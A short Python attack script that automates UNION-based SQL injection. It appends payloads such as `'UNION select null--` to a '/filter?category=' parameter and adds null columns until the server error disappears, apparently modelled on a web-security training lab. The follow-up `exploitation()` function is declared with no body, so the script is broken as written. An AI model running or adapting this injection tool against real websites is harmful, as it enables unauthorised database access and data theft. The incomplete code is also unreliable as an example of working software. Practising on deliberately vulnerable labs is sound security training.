from sys import argv 
from bs4 import BeautifulSoup
import requests

# This function will determine the number of columns required for a successful 
# union injection, after determining the number of columns, it will prompt the
# user for a tailored payload
def no_columns(url):
    try:
        url = url + "/filter?category=" 
        no_columns = 1
        payload = "null"
        while (True):
            query_value = f"'UNION select {payload}--"
            response = requests.get(url+query_value)
            print(url+query_value)
            response = BeautifulSoup(response.text,'html.parser')
            if "Internal Server Error" not in response.text:
                return no_columns,url
            else:
                payload = payload + ",null"
                no_columns = no_columns + 1
        return 0
    except Exception as e:
        print(e)

# Once the number of columns has been determined for a successful union injection
# attack, input the user for a payload
def exploitation():

if __name__ == "__main__":
    try:
        base_url = argv[1]
        column_no,url = no_columns(base_url)
        if column_no > 0:
            print("[+] UNION Injection successful the number of columns is " + str(column_no))
            exploitation()


    except:
        print(f'[-] Usage: python3 {argv[0]} <url>')
